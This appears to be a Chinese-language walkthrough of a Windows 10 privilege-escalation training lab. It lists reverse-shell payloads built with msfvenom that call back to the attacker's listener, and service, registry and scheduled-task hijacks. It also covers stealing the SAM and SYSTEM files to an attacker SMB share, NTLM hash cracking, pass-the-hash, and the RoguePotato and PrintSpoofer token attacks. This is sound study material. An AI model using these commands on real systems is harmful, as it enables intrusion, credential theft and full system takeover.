# windows10privesc


* windows 10.10.139.117
* kali 10.18.1.192  



## 產生反向 Shell 可執行文件


**rdp 連接**
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.139.117
```


**生成 reverse.exe**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.1.192 LPORT=53 -f exe -o reverse.exe
```



**kali 建立 smbserver**
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```
在當前目錄上啟動SMB服務器，並且可以使用NetBIOS名稱“kali”訪問它。請注意，sudo命令用於以提升的權限運行腳本

**window 開啟cmd透過smb 下載 reverse.exe**
```
copy \\10.18.1.192\kali\reverse.exe C:\PrivEsc\reverse.exe
```

**執行後 kali 獲取shell**
```
sudo nc -nvlp 53
```

---

## 服務漏洞 - 不安全的服務權限


```
sc query 
//列出所有服務狀態

sc query state= all type= service | find "SERVICE_NAME" 
//列出所有服務名

sc query daclsvc
//列出 daclsvc 服務狀態

sc config
//修改 Windows 操作系统中服务的配置


sc qc daclsvc
// 查询daclsvc 服务的配置信息
```


**顯示**
```
SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```


* SERVICE_START_NAME: 服务启动的用户名，即 LocalSystem





**檢查「使用者」權限帳號對「daclsvc」的權限服務：**
```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

**參數說明**
```
-u：顯示用戶的有效權限。
-w：顯示對象的擁有者。
-c：顯示對象的安全信息（包括 DACL - Discretionary Access Control List）。
-q：抑制成功消息（僅顯示錯誤）。
user：這是您要檢查權限的用戶名稱。
daclsvc：這是要檢查權限的對象的名稱（例如，文件、目錄或其他可安全化的對象）
```

**顯示**
```
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```


**說明**
```
SERVICE_QUERY_STATUS: 允许查询服务的当前状态。
SERVICE_QUERY_CONFIG: 允许查询服务的配置信息。

//關鍵可以修改
SERVICE_CHANGE_CONFIG: 允许更改服务的配置信息。

SERVICE_INTERROGATE: 允许向服务发出请求以获取有关其状态的信息。
SERVICE_ENUMERATE_DEPENDENTS: 允许枚举依赖于服务的其他服务。
SERVICE_START: 允许启动服务。
SERVICE_STOP: 允许停止服务。
READ_CONTROL: 允许读取对象的安全描述符（Security Descriptor）及其所有者。
```



**修改服務設定並將 BINARY_PATH_NAME (binpath) 設定為您建立的reverse.exe執行檔：**
```
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```



**在 Kali 上啟動偵聽器**
```
sudo nc -nvlp 53
```

**啟動 window 服務拿 system  shell**
```
net start daclsvc
```

---


## 服務漏洞 - 未加引號的服務路徑

**檢查服務**
```
sc qc unquotedsvc
```

**顯示**
```
SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

* BINARY_PATH_NAME 未加引號並包含空格
如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。



**查看目錄權限**
```
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```



**顯示**
```
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

* RW BUILTIN\Users 代表有读写权限的内建用户组（Users）。




**copy 寫入 reverse.exe 並命名為 Common.exe**
```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```



**拿system shell**
```
net start unquotedsvc
```

---

## 服務漏洞 - 註冊表權限較弱

```
sc query state= all type= service | find "SERVICE_NAME" 

sc qc regsvc
```

**顯示**
```
SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```



**HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services  註冊表查看 regsvc**
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services 
```
是 Windows 操作系统中存储服务配置信息的注册表路径。在这个路径下，每个服务都有一个相应的注册表项，其中包含有关服务的各种配置和设置。

請注意 regsvc 服務的登錄項目可由「NT AUTHORITY\INTERACTIVE」寫入。群組（基本上是所有登入使用者）：


**查看註冊表權限**
```
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

**參數說明**
```
u: 用户权限。
v: Verbose 模式，显示详细信息。
w: 对注册表项进行递归检查。
q: 安静模式，只显示错误信息。
k: 显示注册表的权限。
```

**顯示**
```
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS

```

* RW NT AUTHORITY\INTERACTIVE
KEY_ALL_ACCESS 表示拥有对注册表项的全部权限。




**修改服務啟動路徑**
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

**參數說明**
```
reg add: 用于向注册表添加新的键、子键或值的命令。

HKLM\SYSTEM\CurrentControlSet\services\regsvc: 指定注册表项的路径，其中包括服务 regsvc 的配置信息。

/v ImagePath: 指定要添加或修改的注册表值的名称，这里是 ImagePath。
/t REG_EXPAND_SZ: 指定注册表值的数据类型，这里是 REG_EXPAND_SZ，表示值包含可扩展字符串。
/d C:\PrivEsc\reverse.exe: 指定注册表值的数据，这里是将 ImagePath 设置为 C:\PrivEsc\reverse.exe。
/f: 强制执行，即使存在同名的注册表项，也会强制覆盖。
```




**拿system shell**
```
net start regsvc
```

---

## 服務漏洞 - 不安全的服務可執行文件

**檢查服務**
```
sc qc filepermsvc
```
**顯示**
```
SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```



**檢查權限**
```
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```


**顯示**
```

  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS

```

* RW Everyone 每個人
FILE_ALL_ACCESS 代表所有權限






**複製您建立的reverse.exe可執行檔並用它取代filepermservice.exe：**
```
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y

/Y 表示在目标路径已存在同名文件时强制覆盖。
```


**拿system shell**

```
net start filepermsvc
```

---

## 註冊表-自動運行


**查詢註冊表中的 AutoRun 開機啟動**
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

**找到兩個系统在启动时会自动运行的程序**
```
SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
```


**查看權限**
```
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

**參數**
```
-w: 以详细模式显示所有警告。
-v: 以详细模式显示所有错误。
-u: 指定检查用户的SID（安全标识符）。
```


**顯示**
```
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

* RW Everyone
FILE_ALL_ACCESS




**覆寫**
```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```


**NC 監聽等待管理員登入拿shell 管理員身份（admin/password123）**


---

## 註冊表 - AlwaysInstallElevated


**查詢登錄中的 AlwaysInstallElevated 金鑰：**
用于配置 Windows Installer 的安装行为。具体来说，当该注册表项被启用时，普通用户在安装 MSI 包时会以管理员权限进行安装，而不需要管理员的明确授权。

*  AlwaysInstallElevated 存在并被设置为 1
那么 Windows Installer 会以管理员权限执行所有的 MSI 安装

* HKCU 的修改会影响当前用户，而对 HKLM 的修改会影响整个系统

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
//AlwaysInstallElevated    REG_DWORD    0x1


reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
//AlwaysInstallElevated    REG_DWORD    0x1
```



**產生反向 reverse.msi**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.1.192 LPORT=53 -f msi -o reverse.msi
```

**下載**
```
copy \\10.18.1.192\kali\reverse.msi C:\PrivEsc\reverse.msi
```

**window 安裝拿system shell**
```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

**參數說明**
```
msiexec: Windows Installer 的命令行工具，用于安装、修复和卸载 MSI 文件。

/quiet 或 /q: 安静模式，不显示用户界面，安装过程在后台进行。
/qn: 完全无提示模式，安装过程在后台进行，不显示任何用户界面，也不显示错误信息。
/i: 指定安装操作。
C:\PrivEsc\reverse.msi: 要安装的 MSI 文件的路径。
```


---

## 密碼 - 註冊表



**可以在註冊表中搜尋包含單字「password」的鍵和值：**
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```



**包含有关系统登录过程和用户交互的配置信息**
```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```



**找到PuTTY密碼**
```
reg query HKCU /f password /t REG_SZ /s

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42
    ProxyPassword    REG_SZ    password123
```

**仔細查看**
```
reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42"

ProxyUsername    REG_SZ    admin
ProxyPassword    REG_SZ    password123
```



**Winexe** 
```
是linux運行的 windows系統 管理工具，使用比較簡單，前提是獲取用戶名和密碼，
然後連接上被攻擊系統就可以使用。 winexe是通過 文件共享服務 ，在目標系統安裝winexe服並運行。
最大亮點是 執行命令完成後，退出會 自動刪除 對應的服務，為了防止被發現

使用 Winexe 需要满足以下条件：
Winexe 必须在 Linux 或 Unix 操作系统上安装。
Windows 主机必须启用 SMB 协议。
Windows 主机的防火墙必须允许 SMB 协议通过。
要执行的命令必须具有管理员权限。

需要對方開啟端口
TCP 端口 139： 這是 NetBIOS Session Service 的默認端口，用於在 Windows 系統之間進行通信。它是 SMB v1 的通信端口。
TCP 端口 445： 這是用於 Server Message Block（SMB）協議的端口。SMB v2 和 v3 通常使用這個端口。

```


**拿 admin shell**
```
winexe -U 'admin%password123' //10.10.18.186 cmd.exe
```




---

## 密碼 - 保存的信用


**在开始菜单中搜索并打开 "凭据管理器" 或 "Credential Manager"。**


**凭据管理器（Credential Manager）**
用于存储和管理用户的凭据，这些凭据包括用户名、密码和其他身份验证信息。凭据管理器提供了一种集中管理敏感信息的方式，以便用户无需记住所有的用户名和密码。

**凭据管理器中已经保存了密码：**
在之前的交互式登录或使用 cmdkey 等工具保存了凭据，这样后续运行 runas 时可能直接使用保存的凭据。



**查看**
```
cmdkey /list
```


**找到兩筆凭据**
```
Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02nfpgrklkitqatu
    Local machine persistence

    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin
```





**拿 admin shell**
```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```



---

## 密碼 - 安全帳戶管理員 (SAM)

**SAM 和 SYSTEM 檔案可用來擷取使用者密碼雜湊值。**
此虛擬機器在C:\Windows\Repair\ 目錄中不安全地儲存了SAM 和 SYSTEM 檔案的備份。 



**將 SAM 和 SYSTEM 檔案傳輸到您的 Kali VM：**
```
copy C:\Windows\Repair\SAM \\10.18.1.192\kali\
copy C:\Windows\Repair\SYSTEM \\10.18.1.192\kali\
```



* 在 Kali 上，克隆 creddump7 儲存庫（Kali 上的儲存庫已過時，無法為 Windows 10 正確轉儲雜湊值！）並使用它從 SAM 和 SYSTEM 檔案中轉儲雜湊值：

```
git clone https://github.com/Tib3rius/creddump7
pip install pycryptodome
python3 creddump7/pwdump.py SYSTEM SAM
```


**結果**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
```


**舉例:admin**

* **這邊沒有多做NTLM 與 NTLMv2的說明，原理有點複雜。(先照做就可)**

```
NTLMv2 Response: aad3b435b51404eeaad3b435b51404ee
这是用户密码的哈希值，经过 NTLMv2 哈希处理。NTLMv2 是 Windows 系统中常用的身份验证协议之一。这个哈希值表示用户的 NTLMv2 哈希。
```


**Challenge Response: a9fdfa038c4b75ebc76dc855dd74f0da**
```
这是用户对系统生成的挑战的响应的哈希值。在 NTLMv2 身份验证中，服务器生成一个挑战，
并要求客户端提供相应的响应。该响应由用户的密码和一些其他数据生成，用于证明用户知道密码。
```


**爆破**
```
hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
```

**參數說明**
```
-m 1000: 这是 Hashcat 的哈希模式参数。在这个例子中，哈希模式是 1000，这通常表示 NTLM 哈希。
--force:  这个选项强制 Hashcat 运行，即使存在一些潜在的问题或警告
```


**密碼:**
password123

---

## 密碼 - 傳遞雜湊值


**當您可以使用雜湊進行身份驗證時，為什麼要破解密碼雜湊呢？**
使用 pth-winexe 的完整管理員雜湊來產生以管理員身份執行的 shell，而無需破解其密碼。

**請記住，完整的雜湊值包括 LM 和 NTLM 雜湊值，並用冒號分隔：**
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::


**拿 admin shell**
```
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.18.186 cmd.exe

```


**說明**
```
pth-winexe: 这是执行 Pass-the-Hash 攻击的工具。

-U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da': 
这是使用的凭据。这里使用了 NTLM 哈希值进行身份验证，格式为 'username%NTLM_hash:NTLM_hash'。

//10.10.18.186: 这是目标系统的 IP 地址。在这个例子中，是一个示例 IP 地址。

cmd.exe: 这是在远程系统上执行的命令。在这个例子中，是启动命令提示符。
```

---

## 計劃任務


**查看 C:\DevTools\CleanUp.ps1 腳本的內容：**

```
type C:\DevTools\CleanUp.ps1
```

**顯示**
```
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)
Remove-Item C:\DevTools\*.log
```



**檢查權限**
```
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```

**顯示**
```
RW C:\DevTools\CleanUp.ps1
	FILE_ADD_FILE: 允许在目录中创建新的文件。
	FILE_ADD_SUBDIRECTORY: 允许在目录中创建新的子目录。
	FILE_APPEND_DATA: 允许对文件进行附加（写入文件而不覆盖现有数据）。
	FILE_EXECUTE: 允许执行文件。对于目录来说，允许访问目录。
	FILE_LIST_DIRECTORY: 允许列出目录中的文件和子目录。
	FILE_READ_ATTRIBUTES: 允许读取文件或目录的属性。
	FILE_READ_DATA: 允许读取文件的数据。
	FILE_READ_EA: 允许读取文件的扩展属性。
	FILE_TRAVERSE: 允许访问目录。
	FILE_WRITE_ATTRIBUTES: 允许修改文件或目录的属性。
	FILE_WRITE_DATA: 允许写入文件的数据。
	FILE_WRITE_EA: 允许写入文件的扩展属性。
	DELETE: 允许删除文件或目录。
	SYNCHRONIZE: 用于同步操作，通常与其他访问权限一起使用。
	READ_CONTROL: 允许读取安全描述符和所有者。
```



**寫入反向 shell**
```
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

---
## 不安全的 GUI 應用程式

**RDP**
```
rdesktop -u user -p password321 10.10.18.186
```


**運行後，打開命令提示字元並注意 Paint 正在以管理員權限執行：**
```
tasklist /V | findstr mspaint.exe
```



**在“畫圖”中，按一下“檔案”然後“打開”。在開啟檔案對話方塊中，按一下導覽輸入並貼上：**

```
file://c:/windows/system32/cmd.exe
```

**按 Enter 鍵產生以管理員權限執行的命令提示字元。**

---

## 啟動應用程式

**檢查StartUp目錄權限**
```
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

**顯示**
```
  RW BUILTIN\Users
  RW WIN-QBA94KB3IOF\Administrator
  RW WIN-QBA94KB3IOF\admin
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  R  Everyone
```
* RW BUILTIN\Users



**CreateShortcut.vbs 寫入 reverse.lnk 到目錄**
```
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

**執行**
```
cscript C:\PrivEsc\CreateShortcut.vbs
```

**登入admin輸入密碼 啟動拿shell**
```
rdesktop -u admin  10.10.18.186
```


---
## 令牌冒充 - Rogue Potato
### !!! 這題畫圖比較好解釋，rouge potato 比較複雜，這邊只照做

```
SeImpersonatePrivilege 和 SeAssignPrimaryTokenPrivilege 
是 Windows 操作系统中的特权（Privilege）
```






**1. 在 Kali 上設定 socat 重定向器，將 Kali 連接埠 135 轉送到 Windows 上的連接埠 9999：**
```
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.53.240:9999


socat 工具创建一个TCP监听器，监听本地端口135，
然后将传入的连接转发到目标IP地址为10.10.53.240，端口号为9999的远程系统。
```




**2. 在 Kali 上啟動監聽器。透過以管理員使用者身分登入RDP**

```
rdesktop -u admin  10.10.18.186
```

**3. 啟動提升的命令提示字元（右鍵-> 以管理員身分執行）**

**4. 使用PSExec64.exe觸發您使用「本機服務」權限建立的reverse.exe可執行文件帳號：**


**5. 拿到nt authority\local service 的shell**
```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```



**6. 在 Kali 上啟動另一個監聽器。**

**7.執行 RoguePotato 漏洞來觸發以 SYSTEM 權限運行的第二個反向 shell**
```
C:\PrivEsc\RoguePotato.exe -r 10.18.1.192 -e "C:\PrivEsc\reverse.exe" -l 9999
```


**拿到 system shell**



---

## 令牌模擬 - PrintSpoofer

**1. 在 Kali 上啟動監聽器。**

**2. 透過以管理員使用者身分登入RDP**

**3. 啟動提升的命令提示字元（右鍵-> 以管理員身分執行）
並使用PSExec64.exe觸發您使用「本機服務」權限建立的reverse.exe可執行文件帳號：**
```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

**4. 在 Kali 上啟動另一個監聽器。**

**5. 現在，在「本地服務」中觸發反向 shell，執行 PrintSpoofer 漏洞來觸發以 SYSTEM 權限執行的第二個反向 shell（相應地使用您的 Kali IP 更新 IP 位址）：**
```
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```

**拿到 system shell**

--------------------------------------------------------------------------------

## 枚舉工具

**1. winPEASany.exe**
```
C:\PrivEsc\winPEASany.exe
```


**2. Seatbelt.exe**
```
C:\PrivEsc\Seatbelt.exe all
```

**3. PowerUp.ps1**
```
進入 powershell
Import-Module C:\PrivEsc\PowerUp.ps1

輸入
Invoke-AllChecks
```

**4. SharpUp.exe**

```
C:\PrivEsc\SharpUp.exe audit
```


















